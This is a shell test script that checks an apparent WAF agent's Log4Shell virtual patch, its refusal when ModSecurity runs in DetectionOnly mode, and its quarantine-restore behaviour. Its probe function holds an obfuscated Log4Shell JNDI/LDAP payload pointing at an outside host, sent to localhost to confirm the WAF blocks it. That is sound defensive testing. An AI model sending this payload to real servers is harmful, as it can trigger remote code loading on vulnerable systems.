# Sourced by inside.sh before the uninstall: virtual patch and quarantine
# restore through the mock dashboard. Apache with ModSecurity is installed
# from the distribution's packages; where they are not available the virtual
# patch case is reported as skip. Adds "vpatch=... restore=..." to
# EXTRA_RESULT and sets EXTRA_FAIL on a failure.

R_VPATCH=fail R_INEFFECTIVE=fail R_RESTORE=fail
api=http://127.0.0.1:8080

set_sync() { curl -s -X POST -d "$1" "$api/set-sync" >/dev/null; }
# wait_event TYPE KEY VALUE SECONDS: an event of TYPE whose details.KEY = VALUE
# (details keys come sorted, so KEY is found before any nested braces).
wait_event() {
  for _ in $(seq 1 "$4"); do
    curl -s "$api/state" | grep -o "{\"type\":\"$1\"[^}]*" | grep -qF "\"$2\":\"$3\"" && return 0
    sleep 1
  done
  return 1
}
show_events() { curl -s "$api/state" | grep -oE '\{"type":"(virtual_patch|quarantine)[^}]*' | sed 's/^/[waf] event: /'; }

# ── Apache + ModSecurity, rule engine on (as a customer would configure it) ──
if command -v apt-get >/dev/null; then
  # Non-interactive: tzdata (pulled in on Ubuntu 20.04) otherwise waits for a time zone answer.
  { export DEBIAN_FRONTEND=noninteractive TZ=Etc/UTC; apt-get update -qq; apt-get install -y -qq --no-install-recommends apache2 libapache2-mod-security2 </dev/null; } >/tmp/waf-pkg.log 2>&1 &&
    { [ -f /etc/modsecurity/modsecurity.conf ] || cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf; } &&
    sed -i 's/^SecRuleEngine .*/SecRuleEngine On/' /etc/modsecurity/modsecurity.conf &&
    systemctl enable --now apache2 >/dev/null 2>&1
  errlog=/var/log/apache2/error.log wuser=www-data
else
  { dnf install -y -q httpd mod_security >/tmp/waf-pkg.log 2>&1 || yum install -y -q httpd mod_security >>/tmp/waf-pkg.log 2>&1; } &&
    systemctl enable --now httpd >/dev/null 2>&1
  errlog=/var/log/httpd/error_log wuser=apache
fi
mkdir -p /var/www/html && echo ok >/var/www/html/index.html
modsec=no
{ apachectl -M 2>/dev/null || httpd -M 2>/dev/null; } | grep -q security2_module && curl -s -o /dev/null http://127.0.0.1/ && modsec=yes
log "apache with modsecurity: $modsec"

# Log4Shell, obfuscated so only the virtual patch (not the static rules) matches.
probe() { curl -s -o /dev/null -w '%{http_code}' -H 'X-Api-Version: ${${lower:j}ndi:ldap://203.0.113.9/a}' http://127.0.0.1/; }

dyn=/etc/modsecurity/infrafence/infrafence-dynamic.conf
owner_line='# kept by the owner: not InfraFence content'
if [ "$modsec" = yes ]; then
  before=$(probe)
  # The owner's content in the dynamic file survives every change.
  mkdir -p "$(dirname "$dyn")" && printf '# InfraFence dynamic rules\n%s\n' "$owner_line" >"$dyn"
  # Web server changes on, one patch to apply; restart so the agent sees Apache.
  set_sync '{"config":{"bf_threshold":5,"bf_window":60,"monitor_mode":false,"monitor_config":{"webserver_changes":true}},
             "virtual_patches":[{"id":1,"rule_id":"vp-cve-2021-44228","action":"apply"}]}'
  systemctl restart infrafence-agent
  if wait_event virtual_patch_done patch_id 1 90; then
    applied=$(probe)
    grep -q '^# vpatch vp-cve-2021-44228' /etc/modsecurity/infrafence/infrafence-dynamic.conf || applied="missing-rule"
    grep -q 'id "9920004"' "$errlog" || applied="$applied/no-log"
    log "vpatch: before=$before applied=$applied"
    # Remove it again (and quarantine a file for the restore case below).
    set_sync '{"virtual_patches":[{"id":2,"rule_id":"vp-cve-2021-44228","action":"remove"}]}'
    grep -qxF "$owner_line" "$dyn" || applied="$applied/owner-line-lost"
    if [ "$before" != 403 ] && [ "$applied" = 403 ] && wait_event virtual_patch_done patch_id 2 90 && [ "$(probe)" != 403 ] &&
       ! grep -q '^# vpatch' "$dyn" && grep -qxF "$owner_line" "$dyn"; then
      R_VPATCH=ok
    fi
  fi
  [ "$R_VPATCH" = ok ] || { show_events; journalctl -u infrafence-agent --no-pager | grep -E 'vpatch|modsec' | tail -10; tail -5 "$errlog"; cat "$dyn"; }

  # ── rule engine in DetectionOnly: the patch would only log, so it is refused and rolled back ──
  modconf=$(grep -lE '^[[:space:]]*SecRuleEngine' /etc/modsecurity/modsecurity.conf /etc/httpd/conf.d/mod_security.conf 2>/dev/null | head -1)
  if [ -n "$modconf" ]; then
    cp "$modconf" /tmp/modsec.conf.bak
    sed -i 's/^\([[:space:]]*\)SecRuleEngine .*/\1SecRuleEngine DetectionOnly/' "$modconf"
    apachectl graceful >/dev/null 2>&1 || systemctl reload httpd apache2 >/dev/null 2>&1
    sleep 2
    set_sync '{"virtual_patches":[{"id":3,"rule_id":"vp-cve-2021-44228","action":"apply"}]}'
    if wait_event virtual_patch_failed patch_id 3 120; then
      ev=$(curl -s "$api/state" | grep -o '{"type":"virtual_patch_failed"[^}]*' | grep -F '"patch_id":"3"')
      log "detection only: $ev"
      if grep -qF '"reason":"ineffective"' <<<"$ev" && grep -qF 'ineffective: SecRuleEngine is not On' <<<"$ev" &&
         ! grep -q '^# vpatch' "$dyn" && grep -qxF "$owner_line" "$dyn"; then
        R_INEFFECTIVE=ok
      fi
    fi
    cp /tmp/modsec.conf.bak "$modconf"
    apachectl graceful >/dev/null 2>&1 || systemctl reload httpd apache2 >/dev/null 2>&1
    [ "$R_INEFFECTIVE" = ok ] || { show_events; cat "$dyn"; journalctl -u infrafence-agent --no-pager | grep -E 'vpatch|modsec' | tail -5; }
  else
    R_INEFFECTIVE=skip
    log "no SecRuleEngine line found in the ModSecurity configuration"
  fi
else
  R_VPATCH=skip R_INEFFECTIVE=skip
  tail -3 /tmp/waf-pkg.log 2>/dev/null
fi

# ── quarantine restore: owner and mode come back ──
f=/var/www/html/restore-me.php
echo '<?php echo "x";' >"$f"
id "$wuser" >/dev/null 2>&1 || wuser=nobody
chown "$wuser:$wuser" "$f" 2>/dev/null || chown "$wuser" "$f"
chmod 0640 "$f"
want=$(stat -c '%U:%G %a' "$f")
set_sync "{\"quarantine_pending\":[\"$f\"]}"
[ "$modsec" = yes ] || systemctl restart infrafence-agent
if wait_event quarantine_completed file "$f" 90 && [ ! -e "$f" ]; then
  set_sync "{\"quarantine_pending\":null,\"quarantine_restores\":[{\"id\":31,\"file\":\"$f\"}]}"
  if wait_event quarantine_restored restore_id 31 90; then
    got=$(stat -c '%U:%G %a' "$f" 2>/dev/null)
    log "restore: want=$want got=$got"
    [ "$got" = "$want" ] && R_RESTORE=ok
  fi
fi
[ "$R_RESTORE" = ok ] || { show_events; journalctl -u infrafence-agent --no-pager | grep -i quarantine | tail -5; }

EXTRA_RESULT="${EXTRA_RESULT:-} vpatch=$R_VPATCH vpatch_ineffective=$R_INEFFECTIVE restore=$R_RESTORE"
{ [ "$R_VPATCH" = fail ] || [ "$R_INEFFECTIVE" = fail ] || [ "$R_RESTORE" = fail ]; } && EXTRA_FAIL=1
true
